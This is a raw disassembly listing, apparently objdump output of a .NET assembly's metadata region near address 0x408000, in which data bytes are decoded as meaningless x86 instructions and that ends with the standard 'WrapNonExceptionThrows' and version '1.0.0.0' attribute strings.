  407a49:	01 02                	add    %eax,(%edx)
  407a4b:	05 07 02 12 45       	add    $0x45120207,%eax
  407a50:	02 05 20 00 12 81    	add    0x81120020,%al
  407a56:	11 05 20 00 12 81    	adc    %eax,0x81120020
  407a5c:	15 05 00 00 12       	adc    $0x12000005,%eax
  407a61:	81 19 05 20 01 1d    	sbbl   $0x1d012005,(%ecx)
  407a67:	05 0e 04 00 01       	add    $0x100040e,%eax
  407a6c:	0e                   	push   %cs
  407a6d:	0e                   	push   %cs
  407a6e:	05 00 01 1d 05       	add    $0x51d0100,%eax
  407a73:	0e                   	push   %cs
  407a74:	08 20                	or     %ah,(%eax)
  407a76:	03 02                	add    (%edx),%eax
  407a78:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  407a7d:	18 07                	sbb    %al,(%edi)
  407a7f:	0e                   	push   %cs
  407a80:	02 0e                	add    (%esi),%cl
  407a82:	08 02                	or     %al,(%edx)
  407a84:	1d 12 65 1d 12       	sbb    $0x121d6512,%eax
  407a89:	65 08 12             	or     %dl,%gs:(%edx)
  407a8c:	65 02 12             	add    %gs:(%edx),%dl
  407a8f:	69 12 6d 0e 1d 0e    	imul   $0xe1d0e6d,(%edx),%edx
  407a95:	02 0c 20             	add    (%eax,%eiz,1),%cl
  407a98:	03 01                	add    (%ecx),%eax
  407a9a:	11 81 21 11 81 25    	adc    %eax,0x25811121(%ecx)
  407aa0:	11 81 29 05 00 02    	adc    %eax,0x2000529(%ecx)
  407aa6:	02 0e                	add    (%esi),%cl
  407aa8:	0e                   	push   %cs
  407aa9:	06                   	push   %es
  407aaa:	20 01                	and    %al,(%ecx)
  407aac:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  407ab1:	20 01                	and    %al,(%ecx)
  407ab3:	08 08                	or     %cl,(%eax)
  407ab5:	06                   	push   %es
  407ab6:	00 01                	add    %al,(%ecx)
  407ab8:	1d 12 65 0e 06       	sbb    $0x60e6512,%eax
  407abd:	20 02                	and    %al,(%edx)
  407abf:	01 12                	add    %edx,(%edx)
  407ac1:	65 08 03             	or     %al,%gs:(%ebx)
  407ac4:	20 00                	and    %al,(%eax)
  407ac6:	02 05 20 02 01 0e    	add    0xe010220,%al
  407acc:	08 05 20 02 01 0e    	or     %al,0xe010220
  407ad2:	0e                   	push   %cs
  407ad3:	06                   	push   %es
  407ad4:	20 01                	and    %al,(%ecx)
  407ad6:	01 12                	add    %edx,(%edx)
  407ad8:	81 3d 04 20 01 0e 0e 	cmpl   $0x220090e,0xe012004
  407adf:	09 20 02 
  407ae2:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  407ae7:	81 41 05 20 02 08 08 	addl   $0x8080220,0x5(%ecx)
  407aee:	08 04 00             	or     %al,(%eax,%eax,1)
  407af1:	01 01                	add    %eax,(%ecx)
  407af3:	0e                   	push   %cs
  407af4:	06                   	push   %es
  407af5:	20 02                	and    %al,(%edx)
  407af7:	01 12                	add    %edx,(%edx)
  407af9:	59                   	pop    %ecx
  407afa:	02 05 20 02 01 1c    	add    0x1c010220,%al
  407b00:	18 0a                	sbb    %cl,(%edx)
  407b02:	20 03                	and    %al,(%ebx)
  407b04:	01 12                	add    %edx,(%edx)
  407b06:	81 55 02 12 81 51 05 	adcl   $0x5518112,0x2(%ebp)
  407b0d:	20 00                	and    %al,(%eax)
  407b0f:	12 81 59 03 20 00    	adc    0x200359(%ecx),%al
  407b15:	0e                   	push   %cs
  407b16:	0b 20                	or     (%eax),%esp
  407b18:	04 01                	add    $0x1,%al
  407b1a:	0e                   	push   %cs
  407b1b:	12 81 5d 11 81 61    	adc    0x6181115d(%ecx),%al
  407b21:	02 09                	add    (%ecx),%cl
  407b23:	20 04 01             	and    %al,(%ecx,%eax,1)
  407b26:	12 81 69 1c 08 08    	adc    0x8081c69(%ecx),%al
  407b2c:	0c 20                	or     $0x20,%al
  407b2e:	05 12 7d 1d 05       	add    $0x51d7d12,%eax
  407b33:	08 08                	or     %cl,(%eax)
  407b35:	12 81 6d 1c 06 00    	adc    0x61c6d(%ecx),%al
  407b3b:	01 11                	add    %edx,(%ecx)
  407b3d:	81 75 0e 10 07 0c 08 	xorl   $0x80c0710,0xe(%ebp)
  407b44:	02 02                	add    (%edx),%al
  407b46:	02 0a                	add    (%edx),%cl
  407b48:	02 12                	add    (%edx),%dl
  407b4a:	80 81 08 02 02 02 02 	addb   $0x2,0x2020208(%ecx)
  407b51:	05 20 01 08 12       	add    $0x12080120,%eax
  407b56:	7d 06                	jge    0x407b5e
  407b58:	00 02                	add    %al,(%edx)
  407b5a:	08 1d 05 08 06 00    	or     %bl,0x60805
  407b60:	03 0e                	add    (%esi),%ecx
  407b62:	0e                   	push   %cs
  407b63:	0e                   	push   %cs
  407b64:	0e                   	push   %cs
  407b65:	07                   	pop    %es
  407b66:	20 03                	and    %al,(%ebx)
  407b68:	08 1d 05 08 08 06    	or     %bl,0x6080805
  407b6e:	20 01                	and    %al,(%ecx)
  407b70:	01 12                	add    %edx,(%edx)
  407b72:	81 81 04 20 01 01 1c 	addl   $0x9070f1c,0x1012004(%ecx)
  407b79:	0f 07 09 
  407b7c:	1c 02                	sbb    $0x2,%al
  407b7e:	1d 05 02 02 12       	sbb    $0x12020205,%eax
  407b83:	80 85 08 1d 05 02 06 	addb   $0x6,0x2051d08(%ebp)
  407b8a:	00 02                	add    %al,(%edx)
  407b8c:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  407b8f:	02 05 00 01 1d 05    	add    0x51d0100,%al
  407b95:	08 07                	or     %al,(%edi)
  407b97:	20 02                	and    %al,(%edx)
  407b99:	02 08                	add    (%eax),%cl
  407b9b:	11 81 89 07 20 03    	adc    %eax,0x3200789(%ecx)
  407ba1:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  407ba7:	20 01                	and    %al,(%ecx)
  407ba9:	01 1d 05 04 20 01    	add    %ebx,0x1200405
  407baf:	01 0a                	add    %ecx,(%edx)
  407bb1:	04 00                	add    $0x0,%al
  407bb3:	01 01                	add    %eax,(%ecx)
  407bb5:	1c 06                	sbb    $0x6,%al
  407bb7:	07                   	pop    %es
  407bb8:	02 12                	add    (%edx),%dl
  407bba:	80 89 0e 06 20 01 12 	orb    $0x12,0x120060e(%ecx)
  407bc1:	80 89 0e 05 20 02 01 	orb    $0x1,0x220050e(%ecx)
  407bc8:	03 08                	add    (%eax),%ecx
  407bca:	04 20                	add    $0x20,%al
  407bcc:	00 1d 05 03 00 00    	add    %bl,0x305
  407bd2:	01 23                	add    %esp,(%ebx)
  407bd4:	07                   	pop    %es
  407bd5:	10 12                	adc    %dl,(%edx)
  407bd7:	80 8d 0e 02 12 80 91 	orb    $0x91,-0x7fedfdf2(%ebp)
  407bde:	1d 05 0e 1d 12       	sbb    $0x121d0e05,%eax
  407be3:	80 95 08 12 80 95 02 	adcb   $0x2,-0x6a7fedf8(%ebp)
  407bea:	02 12                	add    (%edx),%dl
  407bec:	80 99 12 80 9d 02 12 	sbbb   $0x12,0x29d8012(%ecx)
  407bf3:	80 a1 12 49 05 00 02 	andb   $0x2,0x54912(%ecx)
  407bfa:	0e                   	push   %cs
  407bfb:	0e                   	push   %cs
  407bfc:	0e                   	push   %cs
  407bfd:	05 00 00 12 80       	add    $0x80120000,%eax
  407c02:	95                   	xchg   %eax,%ebp
  407c03:	05 20 00 12 81       	add    $0x81120020,%eax
  407c08:	95                   	xchg   %eax,%ebp
  407c09:	06                   	push   %es
  407c0a:	00 00                	add    %al,(%eax)
  407c0c:	1d 12 80 95 05       	sbb    $0x5958012,%eax
  407c11:	00 01                	add    %al,(%ecx)
  407c13:	0e                   	push   %cs
  407c14:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  407c19:	01 11                	add    %edx,(%ecx)
  407c1b:	81 9d 08 00 01 12 80 	sbbl   $0x80129580,0x12010008(%ebp)
  407c22:	95 12 80 
  407c25:	99                   	cltd
  407c26:	04 06                	add    $0x6,%al
  407c28:	12 80 9d 09 20 02    	adc    0x220099d(%eax),%al
  407c2e:	12 80 9d 0e 11 81    	adc    -0x7eeef163(%eax),%al
  407c34:	a9 05 20 02 01       	test   $0x1022005,%eax
  407c39:	0e                   	push   %cs
  407c3a:	1c 07                	sbb    $0x7,%al
  407c3c:	20 02                	and    %al,(%edx)
  407c3e:	01 0e                	add    %ecx,(%esi)
  407c40:	11 81 b1 03 00 00    	adc    %eax,0x3b1(%ecx)
  407c46:	0e                   	push   %cs
  407c47:	05 07 03 0a 02       	add    $0x20a0307,%eax
  407c4c:	02 03                	add    (%ebx),%al
  407c4e:	20 00                	and    %al,(%eax)
  407c50:	0a 04 07             	or     (%edi,%eax,1),%al
  407c53:	02 02                	add    (%edx),%al
  407c55:	02 04 20             	add    (%eax,%eiz,1),%al
  407c58:	01 02                	add    %eax,(%edx)
  407c5a:	0e                   	push   %cs
  407c5b:	11 07                	adc    %eax,(%edi)
  407c5d:	07                   	pop    %es
  407c5e:	12 80 a5 12 80 a9    	adc    -0x567fed5b(%eax),%al
  407c64:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  407c6a:	0e                   	push   %cs
  407c6b:	02 02                	add    (%edx),%al
  407c6d:	05 20 00 12 80       	add    $0x80120020,%eax
  407c72:	a9 05 20 00 12       	test   $0x12002005,%eax
  407c77:	80 ad 05 20 00 12 80 	subb   $0x80,0x12002005(%ebp)
  407c7e:	b1 04                	mov    $0x4,%cl
  407c80:	20 01                	and    %al,(%ecx)
  407c82:	1c 0e                	sbb    $0xe,%al
  407c84:	03 20                	add    (%eax),%esp
  407c86:	00 18                	add    %bl,(%eax)
  407c88:	05 07 03 02 18       	add    $0x18020307,%eax
  407c8d:	02 03                	add    (%ebx),%al
  407c8f:	20 00                	and    %al,(%eax)
  407c91:	08 03                	or     %al,(%ebx)
  407c93:	07                   	pop    %es
  407c94:	01 0e                	add    %ecx,(%esi)
  407c96:	03 00                	add    (%eax),%eax
  407c98:	00 08                	add    %cl,(%eax)
  407c9a:	05 00 00 12 81       	add    $0x81120000,%eax
  407c9f:	c9                   	leave
  407ca0:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  407ca5:	1c 0f                	sbb    $0xf,%al
  407ca7:	07                   	pop    %es
  407ca8:	07                   	pop    %es
  407ca9:	12 80 b5 1d 05 12    	adc    0x12051db5(%eax),%al
  407caf:	80 b9 1d 05 08 05 0e 	cmpb   $0xe,0x508051d(%ecx)
  407cb6:	06                   	push   %es
  407cb7:	20 01                	and    %al,(%ecx)
  407cb9:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  407cbe:	20 01                	and    %al,(%ecx)
  407cc0:	12 80 b9 0e 05 20    	adc    0x20050eb9(%eax),%al
  407cc6:	02 0e                	add    (%esi),%cl
  407cc8:	08 08                	or     %cl,(%eax)
  407cca:	0b 07                	or     (%edi),%eax
  407ccc:	04 12                	add    $0x12,%al
  407cce:	80 89 02 11 80 bd 1d 	orb    $0x1d,-0x427feefe(%ecx)
  407cd5:	05 05 20 02 0e       	add    $0xe022005,%eax
  407cda:	0e                   	push   %cs
  407cdb:	0e                   	push   %cs
  407cdc:	03 00                	add    (%eax),%eax
  407cde:	00 02                	add    %al,(%edx)
  407ce0:	05 20 00 11 80       	add    $0x80110020,%eax
  407ce5:	bd 05 00 00 12       	mov    $0x12000005,%ebp
  407cea:	81 d9 06 20 01 01    	sbb    $0x1012006,%ecx
  407cf0:	12 81 d9 06 20 01    	adc    0x12006d9(%ecx),%al
  407cf6:	02 11                	add    (%ecx),%dl
  407cf8:	81 e1 13 07 06 12    	and    $0x12060713,%ecx
  407cfe:	80 a5 15 12 80 c1 01 	andb   $0x1,-0x3e7fedeb(%ebp)
  407d05:	0e                   	push   %cs
  407d06:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  407d0c:	02 0e                	add    (%esi),%cl
  407d0e:	06                   	push   %es
  407d0f:	15 12 80 c1 01       	adc    $0x1c18012,%eax
  407d14:	0e                   	push   %cs
  407d15:	05 20 01 01 13       	add    $0x13010120,%eax
  407d1a:	00 05 20 00 1d 13    	add    %al,0x131d0020
  407d20:	00 06                	add    %al,(%esi)
  407d22:	00 02                	add    %al,(%edx)
  407d24:	0e                   	push   %cs
  407d25:	0e                   	push   %cs
  407d26:	1d 0e 12 07 06       	sbb    $0x607120e,%eax
  407d2b:	1d 12 80 c5 1d       	sbb    $0x1dc58012,%eax
  407d30:	12 80 c5 08 12 80    	adc    -0x7fedf73b(%eax),%al
  407d36:	c5 02                	lds    (%edx),%eax
  407d38:	12 80 c5 06 00 00    	adc    0x6c5(%eax),%al
  407d3e:	1d 12 80 c5 05       	sbb    $0x5c58012,%eax
  407d43:	20 00                	and    %al,(%eax)
  407d45:	11 81 e5 09 00 02    	adc    %eax,0x20009e5(%ecx)
  407d4b:	02 11                	add    (%ecx),%dl
  407d4d:	81 e5 11 81 e5 08    	and    $0x8e58111,%ebp
  407d53:	07                   	pop    %es
  407d54:	04 12                	add    $0x12,%al
  407d56:	80 b9 18 02 0e 02 06 	cmpb   $0x6,0x20e0218(%ecx)
  407d5d:	08 07                	or     %al,(%edi)
  407d5f:	20 03                	and    %al,(%ebx)
  407d61:	01 02                	add    %eax,(%edx)
  407d63:	0e                   	push   %cs
  407d64:	10 02                	adc    %al,(%edx)
  407d66:	06                   	push   %es
  407d67:	00 01                	add    %al,(%ecx)
  407d69:	01 12                	add    %edx,(%edx)
  407d6b:	81 ed 08 07 03 12    	sub    $0x12030708,%ebp
  407d71:	80 9d 02 12 49 08 20 	sbbb   $0x20,0x8491202(%ebp)
  407d78:	03 01                	add    (%ecx),%eax
  407d7a:	0e                   	push   %cs
  407d7b:	1c 11                	sbb    $0x11,%al
  407d7d:	81 f5 0a 07 04 12    	xor    $0x1204070a,%ebp
  407d83:	80 9d 1c 1d 05 12 49 	sbbb   $0x49,0x12051d1c(%ebp)
  407d8a:	06                   	push   %es
  407d8b:	20 01                	and    %al,(%ecx)
  407d8d:	12 80 9d 0e 02 1d    	adc    0x1d020e9d(%eax),%al
  407d93:	05 07 20 02 12       	add    $0x12022007,%eax
  407d98:	80 9d 0e 02 1e 07 0b 	sbbb   $0xb,0x71e020e(%ebp)
  407d9f:	12 80 89 0e 0e 12    	adc    0x120e0e89(%eax),%al
  407da5:	80 89 02 12 80 89 12 	orb    $0x12,-0x767fedfe(%ecx)
  407dac:	49                   	dec    %ecx
  407dad:	15 11 80 d9 01       	adc    $0x1d98011,%eax
  407db2:	12 80 89 12 80 89    	adc    -0x767fed77(%eax),%al
  407db8:	02 12                	add    (%edx),%dl
  407dba:	49                   	dec    %ecx
  407dbb:	08 15 12 80 c1 01    	or     %dl,0x1c18012
  407dc1:	12 80 89 11 10 01    	adc    0x1101189(%eax),%al
  407dc7:	01 15 12 80 c1 01    	add    %edx,0x1c18012
  407dcd:	1e                   	push   %ds
  407dce:	00 15 12 81 fd 01    	add    %dl,0x1fd8112
  407dd4:	1e                   	push   %ds
  407dd5:	00 05 0a 01 12 80    	add    %al,0x8012010a
  407ddb:	89 09                	mov    %ecx,(%ecx)
  407ddd:	20 00                	and    %al,(%eax)
  407ddf:	15 11 80 d9 01       	adc    $0x1d98011,%eax
  407de4:	13 00                	adc    (%eax),%eax
  407de6:	08 15 11 80 d9 01    	or     %dl,0x1d98011
  407dec:	12 80 89 04 20 00    	adc    0x200489(%eax),%al
  407df2:	13 00                	adc    (%eax),%eax
  407df4:	05 20 01 02 13       	add    $0x13020120,%eax
  407df9:	00 09                	add    %cl,(%ecx)
  407dfb:	07                   	pop    %es
  407dfc:	03 12                	add    (%edx),%edx
  407dfe:	80 dd 12             	sbb    $0x12,%ch
  407e01:	80 e1 1c             	and    $0x1c,%cl
  407e04:	05 00 00 12 82       	add    $0x82120000,%eax
  407e09:	01 06                	add    %eax,(%esi)
  407e0b:	00 01                	add    %al,(%ecx)
  407e0d:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  407e12:	20 01                	and    %al,(%ecx)
  407e14:	12 80 dd 1d 05 06    	adc    0x6051ddd(%eax),%al
  407e1a:	20 01                	and    %al,(%ecx)
  407e1c:	12 80 e1 0e 06 00    	adc    0x60ee1(%eax),%al
  407e22:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  407e25:	80 e1 08             	and    $0x8,%cl
  407e28:	00 01                	add    %al,(%ecx)
  407e2a:	12 80 e1 11 82 0d    	adc    0xd8211e1(%eax),%al
  407e30:	09 00                	or     %eax,(%eax)
  407e32:	02 12                	add    (%edx),%dl
  407e34:	82 11 11             	adcb   $0x11,(%ecx)
  407e37:	82 15 0e 1c 00 05 12 	adcb   $0x12,0x5001c0e
  407e3e:	82 1d 11 82 21 0e 15 	sbbb   $0x15,0xe218211
  407e45:	12 81 fd 01 12 80    	adc    -0x7fedfe03(%ecx),%al
  407e4b:	e1 12                	loope  0x407e5f
  407e4d:	80 e1 15             	and    $0x15,%cl
  407e50:	12 81 fd 01 12 82    	adc    -0x7dedfe03(%ecx),%al
  407e56:	11 1b                	adc    %ebx,(%ebx)
  407e58:	15 12 80 e5 01       	adc    $0x1e58012,%eax
  407e5d:	15 12 80 e9 0a       	adc    $0xae98012,%eax
  407e62:	12 80 ed 1c 12 59    	adc    0x59121ced(%eax),%al
  407e68:	12 41 0e             	adc    0xe(%ecx),%al
  407e6b:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  407e70:	0e                   	push   %cs
  407e71:	0e                   	push   %cs
  407e72:	0e                   	push   %cs
  407e73:	0c 00                	or     $0x0,%al
  407e75:	01 15 12 80 e5 01    	add    %edx,0x1e58012
  407e7b:	13 00                	adc    (%eax),%eax
  407e7d:	12 82 1d 03 06 13    	adc    0x1306031d(%edx),%al
  407e83:	00 16                	add    %dl,(%esi)
  407e85:	15 12 80 e9 0a       	adc    $0xae98012,%eax
  407e8a:	12 80 ed 1c 12 59    	adc    0x59121ced(%eax),%al
  407e90:	12 41 0e             	adc    0xe(%ecx),%al
  407e93:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  407e98:	0e                   	push   %cs
  407e99:	0e                   	push   %cs
  407e9a:	0e                   	push   %cs
  407e9b:	17                   	pop    %ss
  407e9c:	20 0a                	and    %cl,(%edx)
  407e9e:	01 13                	add    %edx,(%ebx)
  407ea0:	00 13                	add    %dl,(%ebx)
  407ea2:	01 13                	add    %edx,(%ebx)
  407ea4:	02 13                	add    (%ebx),%dl
  407ea6:	03 13                	add    (%ebx),%edx
  407ea8:	04 13                	add    $0x13,%al
  407eaa:	05 13 06 13 07       	add    $0x7130613,%eax
  407eaf:	13 08                	adc    (%eax),%ecx
  407eb1:	13 09                	adc    (%ecx),%ecx
  407eb3:	05 07 01 12 80       	add    $0x80120107,%eax
  407eb8:	89 06                	mov    %eax,(%esi)
  407eba:	07                   	pop    %es
  407ebb:	02 02                	add    (%edx),%al
  407ebd:	12 80 f1 07 20 03    	adc    0x32007f1(%eax),%al
  407ec3:	01 0e                	add    %ecx,(%esi)
  407ec5:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  407eca:	01 1d 05 08 05 00    	add    %ebx,0x50805
  407ed0:	01 0e                	add    %ecx,(%esi)
  407ed2:	1d 05 13 07 07       	sbb    $0x7071305,%eax
  407ed7:	02 12                	add    (%edx),%dl
  407ed9:	80 85 12 80 f5 12 80 	addb   $0x80,0x12f58012(%ebp)
  407ee0:	f9                   	stc
  407ee1:	12 80 fd 1d 05 1d    	adc    0x1d051dfd(%eax),%al
  407ee7:	05 06 20 01 01       	add    $0x1012006,%eax
  407eec:	11 82 35 06 20 01    	adc    %eax,0x1200635(%edx)
  407ef2:	01 11                	add    %edx,(%ecx)
  407ef4:	82 39 05             	cmpb   $0x5,(%ecx)
  407ef7:	20 00                	and    %al,(%eax)
  407ef9:	12 82 3d 0c 20 03    	adc    0x3200c3d(%edx),%al
  407eff:	01 12                	add    %edx,(%edx)
  407f01:	81 55 12 82 3d 11 82 	adcl   $0x82113d82,0x12(%ebp)
  407f08:	41                   	inc    %ecx
  407f09:	08 20                	or     %ah,(%eax)
  407f0b:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  407f11:	08 05 20 01 0e 1d    	or     %al,0x1d0e0120
  407f17:	05 1c 07 0c 02       	add    $0x20c071c,%eax
  407f1c:	12 80 85 12 80 f5    	adc    -0xa7fed7b(%eax),%al
  407f22:	1d 05 12 80 fd       	sbb    $0xfd801205,%eax
  407f27:	1d 05 1d 05 02       	sbb    $0x2051d05,%eax
  407f2c:	12 80 f9 1d 05 1d    	adc    0x1d051df9(%eax),%al
  407f32:	05 1d 05 0c 00       	add    $0xc051d,%eax
  407f37:	05 01 12 82 4d       	add    $0x4d821201,%eax
  407f3c:	08 12                	or     %dl,(%edx)
  407f3e:	82 4d 08 08          	orb    $0x8,0x8(%ebp)
  407f42:	07                   	pop    %es
  407f43:	07                   	pop    %es
  407f44:	05 02 08 02 02       	add    $0x2020802,%eax
  407f49:	02 09                	add    (%ecx),%cl
  407f4b:	00 02                	add    %al,(%edx)
  407f4d:	01 12                	add    %edx,(%edx)
  407f4f:	82 4d 11 82          	orb    $0x82,0x11(%ebp)
  407f53:	55                   	push   %ebp
  407f54:	0f 07                	sysret
  407f56:	07                   	pop    %es
  407f57:	1d 05 12 80 b9       	sbb    $0xb9801205,%eax
  407f5c:	12 81 01 1d 05 08    	adc    0x8051d01(%ecx),%al
  407f62:	05 0e 07 07 02       	add    $0x207070e,%eax
  407f67:	12 81 01 1d 05 08    	adc    0x8051d01(%ecx),%al
  407f6d:	b7 7a                	mov    $0x7a,%bh
  407f6f:	5c                   	pop    %esp
  407f70:	56                   	push   %esi
  407f71:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  407f74:	89 08                	mov    %ecx,(%eax)
  407f76:	b0 3f                	mov    $0x3f,%al
  407f78:	5f                   	pop    %edi
  407f79:	7f 11                	jg     0x407f8c
  407f7b:	d5 0a                	aad    $0xa
  407f7d:	3a 04 20             	cmp    (%eax,%eiz,1),%al
  407f80:	00 00                	add    %al,(%eax)
  407f82:	00 04 40             	add    %al,(%eax,%eax,2)
  407f85:	00 00                	add    %al,(%eax)
  407f87:	00 04 10             	add    %al,(%eax,%edx,1)
  407f8a:	00 00                	add    %al,(%eax)
  407f8c:	00 04 00             	add    %al,(%eax,%eax,1)
  407f8f:	00 00                	add    %al,(%eax)
  407f91:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  407f95:	00 00                	add    %al,(%eax)
  407f97:	04 01                	add    $0x1,%al
  407f99:	00 00                	add    %al,(%eax)
  407f9b:	00 02                	add    %al,(%edx)
  407f9d:	06                   	push   %es
  407f9e:	0e                   	push   %cs
  407f9f:	03 06                	add    (%esi),%eax
  407fa1:	12 41 03             	adc    0x3(%ecx),%al
  407fa4:	06                   	push   %es
  407fa5:	12 3c 03             	adc    (%ebx,%eax,1),%bh
  407fa8:	06                   	push   %es
  407fa9:	12 59 03             	adc    0x3(%ecx),%bl
  407fac:	06                   	push   %es
  407fad:	12 5d 03             	adc    0x3(%ebp),%bl
  407fb0:	06                   	push   %es
  407fb1:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  407fb6:	03 06                	add    (%esi),%eax
  407fb8:	12 61 02             	adc    0x2(%ecx),%ah
  407fbb:	06                   	push   %es
  407fbc:	02 02                	add    (%edx),%al
  407fbe:	06                   	push   %es
  407fbf:	1c 04                	sbb    $0x4,%al
  407fc1:	06                   	push   %es
  407fc2:	12 80 cd 09 06 15    	adc    0x150609cd(%eax),%al
  407fc8:	12 80 c1 01 12 80    	adc    -0x7fedfe3f(%eax),%al
  407fce:	89 03                	mov    %eax,(%ebx)
  407fd0:	06                   	push   %es
  407fd1:	11 50 02             	adc    %edx,0x2(%eax)
  407fd4:	06                   	push   %es
  407fd5:	09 03                	or     %eax,(%ebx)
  407fd7:	06                   	push   %es
  407fd8:	11 48 1c             	adc    %ecx,0x1c(%eax)
  407fdb:	06                   	push   %es
  407fdc:	15 12 80 e5 01       	adc    $0x1e58012,%eax
  407fe1:	15 12 80 e9 0a       	adc    $0xae98012,%eax
  407fe6:	12 80 ed 1c 12 59    	adc    0x59121ced(%eax),%al
  407fec:	12 41 0e             	adc    0xe(%ecx),%al
  407fef:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  407ff4:	0e                   	push   %cs
  407ff5:	0e                   	push   %cs
  407ff6:	0e                   	push   %cs
  407ff7:	04 00                	add    $0x0,%al
  407ff9:	00 12                	add    %dl,(%edx)
  407ffb:	59                   	pop    %ecx
  407ffc:	05 00 01 01 12       	add    $0x12010100,%eax
  408001:	59                   	pop    %ecx
  408002:	04 00                	add    $0x0,%al
  408004:	00 12                	add    %dl,(%edx)
  408006:	5d                   	pop    %ebp
  408007:	05 00 01 01 12       	add    $0x12010100,%eax
  40800c:	5d                   	pop    %ebp
  40800d:	04 00                	add    $0x0,%al
  40800f:	00 1d 05 05 00 01    	add    %bl,0x1000505
  408015:	01 1d 05 03 00 00    	add    %ebx,0x305
  40801b:	0a 04 00             	or     (%eax,%eax,1),%al
  40801e:	01 01                	add    %eax,(%ecx)
  408020:	0a 04 00             	or     (%eax,%eax,1),%al
  408023:	00 12                	add    %dl,(%edx)
  408025:	61                   	popa
  408026:	05 00 01 01 12       	add    $0x12010100,%eax
  40802b:	61                   	popa
  40802c:	04 00                	add    $0x0,%al
  40802e:	01 01                	add    %eax,(%ecx)
  408030:	02 03                	add    (%ebx),%al
  408032:	00 00                	add    %al,(%eax)
  408034:	1c 0a                	sbb    $0xa,%al
  408036:	00 04 02             	add    %al,(%edx,%eax,1)
  408039:	1c 12                	sbb    $0x12,%al
  40803b:	71 12                	jno    0x40804f
  40803d:	75 11                	jne    0x408050
  40803f:	79 05                	jns    0x408046
  408041:	00 01                	add    %al,(%ecx)
  408043:	01 12                	add    %edx,(%edx)
  408045:	7d 08                	jge    0x40804f
  408047:	00 01                	add    %al,(%ecx)
  408049:	12 80 c5 12 80 c9    	adc    -0x367fed3b(%eax),%al
  40804f:	03 00                	add    (%eax),%eax
  408051:	00 18                	add    %bl,(%eax)
  408053:	08 00                	or     %al,(%eax)
  408055:	03 08                	add    (%eax),%ecx
  408057:	18 12                	sbb    %dl,(%edx)
  408059:	80 b9 08 04 00 01 18 	cmpb   $0x18,0x1000408(%ecx)
  408060:	0e                   	push   %cs
  408061:	06                   	push   %es
  408062:	00 02                	add    %al,(%edx)
  408064:	02 18                	add    (%eax),%bl
  408066:	10 02                	adc    %al,(%edx)
  408068:	06                   	push   %es
  408069:	00 01                	add    %al,(%ecx)
  40806b:	11 48 11             	adc    %ecx,0x11(%eax)
  40806e:	48                   	dec    %eax
  40806f:	06                   	push   %es
  408070:	00 03                	add    %al,(%ebx)
  408072:	01 09                	add    %ecx,(%ecx)
  408074:	09 09                	or     %ecx,(%ecx)
  408076:	07                   	pop    %es
  408077:	00 02                	add    %al,(%edx)
  408079:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40807c:	80 d5 06             	adc    $0x6,%ch
  40807f:	00 02                	add    %al,(%edx)
  408081:	02 0e                	add    (%esi),%cl
  408083:	1d 05 06 00 01       	sbb    $0x1000605,%eax
  408088:	01 12                	add    %edx,(%edx)
  40808a:	80 89 07 20 02 02 1d 	orb    $0x1d,0x2022007(%ecx)
  408091:	05 1d 05 04 08       	add    $0x804051d,%eax
  408096:	00 12                	add    %dl,(%edx)
  408098:	59                   	pop    %ecx
  408099:	04 08                	add    $0x8,%al
  40809b:	00 12                	add    %dl,(%edx)
  40809d:	5d                   	pop    %ebp
  40809e:	04 08                	add    $0x8,%al
  4080a0:	00 1d 05 03 08 00    	add    %bl,0x80305
  4080a6:	0a 04 08             	or     (%eax,%ecx,1),%al
  4080a9:	00 12                	add    %dl,(%edx)
  4080ab:	61                   	popa
  4080ac:	03 08                	add    (%eax),%ecx
  4080ae:	00 02                	add    %al,(%edx)
  4080b0:	03 08                	add    (%eax),%ecx
  4080b2:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  4080b5:	08 00                	or     %al,(%eax)
  4080b7:	08 08                	or     %cl,(%eax)
  4080b9:	01 00                	add    %eax,(%eax)
  4080bb:	08 00                	or     %al,(%eax)
  4080bd:	00 00                	add    %al,(%eax)
  4080bf:	00 00                	add    %al,(%eax)
  4080c1:	1e                   	push   %ds
  4080c2:	01 00                	add    %eax,(%eax)
  4080c4:	01 00                	add    %eax,(%eax)
  4080c6:	54                   	push   %esp
  4080c7:	02 16                	add    (%esi),%dl
  4080c9:	57                   	push   %edi
  4080ca:	72 61                	jb     0x40812d
  4080cc:	70 4e                	jo     0x40811c
  4080ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4080cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4080d0:	45                   	inc    %ebp
  4080d1:	78 63                	js     0x408136
  4080d3:	65 70 74             	gs jo  0x40814a
  4080d6:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  4080dd:	77 73                	ja     0x408152
  4080df:	01 08                	add    %ecx,(%eax)
  4080e1:	01 00                	add    %eax,(%eax)
  4080e3:	07                   	pop    %es
  4080e4:	01 00                	add    %eax,(%eax)
  4080e6:	00 00                	add    %al,(%eax)
  4080e8:	00 05 01 00 00 00    	add    %al,0x1
  4080ee:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4080f1:	00 07                	add    %al,(%edi)
  4080f3:	31 2e                	xor    %ebp,(%esi)
  4080f5:	30 2e                	xor    %ch,(%esi)
  4080f7:	30 2e                	xor    %ch,(%esi)
  4080f9:	30 00                	xor    %al,(%eax)
  4080fb:	00 49 01             	add    %cl,0x1(%ecx)
